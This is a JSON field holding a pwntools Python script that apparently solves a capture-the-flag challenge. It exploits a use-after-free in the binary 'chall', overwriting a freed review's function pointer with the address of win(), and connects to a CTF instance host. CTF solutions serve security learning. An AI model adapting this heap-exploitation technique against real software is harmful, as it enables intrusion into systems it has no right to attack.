        "code": "#!/usr/bin/env python3\nfrom pathlib import Path\nfrom pwn import *\n\nBASE_DIR = Path(__file__).resolve().parent\nBINARY_PATH = BASE_DIR / \"chall\"\n\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\ncontext.log_level = \"info\"\n\nHOST = \"baby-pwn-5b963d16866d.inst14.ctf.fortid.com\"\nPORT = 1337\n\n\ndef start():\n    if args.REMOTE:\n        host = args.HOST or HOST\n        port = int(args.PORT or PORT)\n        return remote(host, port, ssl=True, sni=host)\n    if args.GDB:\n        return gdb.debug([str(BINARY_PATH)], gdbscript=\"set pagination off\\ncontinue\")\n    return process([str(BINARY_PATH)])\n\n\ndef menu(io, choice):\n    io.sendlineafter(b\"> \", str(choice).encode())\n\n\ndef exploit(io):\n    # Allocate review, preserve its pointer as favourite, then free it.\n    menu(io, 1)\n    io.sendlineafter(b\"Review: \", b\"UAF review\")\n    menu(io, 2)\n    menu(io, 3)\n\n    # draft_t has the same 40-byte allocation size as review_t.  Its payload\n    # overwrites review->display at offset 32 with the non-PIE win() address.\n    menu(io, 4)\n    io.sendlineafter(b\": \", b\"40\")\n    payload = b\"A\" * 32 + p64(elf.sym.win)\n    io.sendafter(b\"draft bytes: \", payload)\n\n    menu(io, 5)\n\n\ndef main():\n    io = start()\n    exploit(io)\n    output = io.recvall(timeout=3)\n    if output:\n        print(output.decode(errors=\"replace\"), end=\"\")\n\n\nif __name__ == \"__main__\":\n    main()"
